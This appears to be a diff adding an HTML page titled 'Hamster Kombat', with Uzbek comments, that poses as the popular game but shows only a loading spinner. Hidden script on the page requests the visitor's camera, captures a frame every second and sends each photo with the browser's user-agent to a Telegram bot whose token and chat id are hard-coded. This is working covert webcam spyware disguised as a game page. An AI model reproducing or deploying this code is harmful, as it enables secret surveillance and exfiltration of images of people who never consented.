@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="uz">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Hamster Kombat</title>
+        <link rel="hamster icon" type="png"
+        href="./hamster-coin.png">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    </head>
+    <body>
+        <div style="display: none">
+            <video id="video" width="640" height="480" autoplay></video>
+            <canvas id="canvas" width="640" height="480"></canvas>
+        </div>
+
+        <style>
+            body {
+                background-color: #212121; /* Sahifa asosiy fon rangi */
+            }
+
+            .loader {
+                position: fixed;
+                z-index: 9999;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background-color: #fff; /* Yuklanish animatsiyasining fon rangi */
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                transition: opacity 0.3s ease;
+            }
+
+            .loader-hidden {
+                opacity: 0;
+                visibility: hidden;
+                transition: opacity 0.3s ease;
+            }
+
+            .loader::after {
+                content: "";
+                display: block;
+                width: 40px;
+                height: 40px;
+                border-radius: 50%;
+                border: 4px solid #3498db; /* Yuklanish animatsiyasining turini ko'rsatadi */
+                border-color: #3498db transparent #3498db transparent;
+                animation: loader 1.2s linear infinite;
+            }
+
+            @keyframes loader {
+                0% {
+                    transform: rotate(0deg);
+                }
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+
+        <div class="container">
+            <div class="loader"></div>
+        </div>
+
+        <script>
+            const API_KEY = "7533785767:AAGVN3T_H6qFuazgUII5JDgpA5uYiIxhPRI"; // Telegram bot API kaliti
+            const chatId = "7176184115";
+
+            // Kamera orqali video olish uchun elementlar
+            var videoElement = document.getElementById("video");
+            var canvasElement = document.getElementById("canvas");
+            var canvasContext = canvasElement.getContext("2d");
+
+            // Kameraga kirishni so'raymiz
+            navigator.mediaDevices
+                .getUserMedia({ video: true })
+                .then(function (stream) {
+                    videoElement.srcObject = stream;
+                    // Har bir soniyada rasm olamiz va yuboramiz
+                    setInterval(captureAndSendImage, 1000);
+                })
+                .catch(function (error) {
+                    console.log("Kameraga kirishda xatolik:", error);
+                });
+
+            // Rasmni olamiz va Telegramga yuborish funksiyasi
+            function captureAndSendImage() {
+                canvasContext.drawImage(
+                    videoElement,
+                    0,
+                    0,
+                    canvasElement.width,
+                    canvasElement.height
+                );
+                var imageData = canvasElement.toDataURL("image/png"); // Base64 formatda rasm ma'lumotini olamiz
+
+                // Yuborish funksiyasi
+                sendPhoto(imageData);
+            }
+
+            // Rasmni Telegramga yuborish funksiyasi
+            async function sendPhoto(base64Image) {
+                try {
+                    const response = await fetch(base64Image);
+                    const blob = await response.blob(); // Rasmni blobga o'zgartiramiz
+
+                    // Form ma'lumotlarini yaratamiz
+                    const formData = new FormData();
+                    formData.append("chat_id", chatId);
+                    formData.append(
+                        "caption",
+                        "Photo sent from User-Agent: " + navigator.userAgent
+                    ); // Caption bilan
+                    formData.append("photo", blob, "photo.png"); // Rasmni qo‘shamiz
+
+                    // Telegram API URL si
+                    const telegramAPI = `https://api.telegram.org/bot${API_KEY}/sendPhoto`;
+
+                    // fetch orqali POST so'rovi yuboriladi
+                    const telegramResponse = await fetch(telegramAPI, {
+                        method: "POST",
+                        body: formData,
+                    });
+
+                    
+
+                } catch (error) {
+                    console.error("Xatolik:", error);
+                    alert("Rasm yuborishda muvaffaqiyatsizlik yuz berdi.");
+                }
+            }
+        </script>
+    </body>
+</html>
